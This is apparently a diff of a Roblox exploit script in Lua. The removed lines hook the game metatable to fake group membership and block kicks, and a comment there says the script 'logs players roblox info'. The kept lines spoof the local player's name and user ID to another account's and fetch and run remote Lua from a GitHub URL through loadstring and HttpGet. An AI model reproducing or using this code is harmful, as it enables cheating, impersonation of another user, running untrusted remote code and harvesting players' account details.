@@ -1,25 +1,6 @@
--- lol ez made took me 5 sec, it logs players roblox info btw like username etc so be careful
-
-local mt = getrawmetatable(game)
-make_writeable(mt)
-
-local namecall = mt.__namecall
-
-mt.__namecall = newcclosure(function(self, ...)
-    local method = getnamecallmethod()
-    local args = {...}
-
-    if method == "IsInGroup" then
-      return true
-    end
-    if method == "Kick" then
-      return
-    end
-    return namecall(self, table.unpack(args))
-end)
+-- ez rayx L, by using this you dont have to join their group and you'll be immune to their premium cmds
 
 game.Players.LocalPlayer.Name = "Kiokune"
-
 game.Players.LocalPlayer.UserId = 3468728207
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
